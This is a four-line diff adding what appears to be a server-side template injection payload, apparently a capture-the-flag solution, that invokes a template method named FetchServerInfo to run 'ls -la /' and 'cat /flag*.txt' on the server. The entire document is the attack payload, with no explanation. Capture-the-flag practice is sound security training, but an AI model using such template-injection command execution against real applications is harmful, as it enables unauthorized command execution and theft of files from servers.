@@ -1,0 +1,4 @@
+FILES:
+{{ .FetchServerInfo "ls -la /" }}
+FLAG:
+{{ .FetchServerInfo "cat /flag*.txt" }}
